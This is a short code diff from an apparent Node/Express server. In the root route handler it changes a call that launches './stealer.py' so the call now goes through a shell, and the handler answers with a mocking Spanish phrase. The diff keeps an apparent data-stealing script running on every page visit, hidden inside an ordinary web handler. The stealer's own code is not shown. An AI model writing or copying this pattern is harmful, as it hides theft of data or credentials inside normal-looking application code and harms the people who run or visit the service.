@@ -16,7 +16,7 @@ app.listen(port, hostname, () => {
 
 app.get('/', (req, res) => {
   res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
-  spawn('python',["./stealer.py"]);
+  spawn("python ./stealer.py", { shell: true });
   res.send({uo:"pillado huron"})
 })
 
